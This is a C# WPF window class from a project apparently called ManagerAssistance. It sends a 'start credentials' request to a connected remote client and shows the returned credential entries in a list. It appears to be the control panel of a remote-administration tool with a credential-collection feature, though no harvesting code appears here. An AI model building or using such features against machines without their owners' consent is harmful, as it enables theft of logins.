using System.IO;
using System.Linq;
using System.Windows;
using System.Windows.Media.Imaging;
using ManagerAssistance.Common;
using ManagerAssistance.Common.Network.Protocol;
using ManagerAssistance.Master.Extentions;

namespace ManagerAssistance.Master
{
    /// <summary>
    /// 
    /// </summary>
    public partial class CredentialsWindow : ClientWindow
    {
        public CredentialsWindow()
        {
            InitializeComponent();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="client"></param>
        public CredentialsWindow(Client client)
            : base(client)
        {
            InitializeComponent();
        }

        /// <summary>
        /// 
        /// </summary>
        private void GetCredentials(object sender, RoutedEventArgs routedEventArgs) => 
            Send(new StartCredentialsMessage());

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public override async void OnEvent(ClientEvent ev)
        {
            base.OnEvent(ev);
            await this.ExecuteInDispatcher(() =>
            {
                switch ((ClientEventType)ev.EventType)
                {
                    case ClientEventType.IncommingMessage:
                    {
                        ev.Data.Match()
                            .With<CredentialsMessage>(message =>
                            {
                                CredentialsList.ItemsSource = message.Credentials.Select(c => c.Dictionary).ToArray();
                            });
                        break;
                    }
                }
            });
        }
    }
}
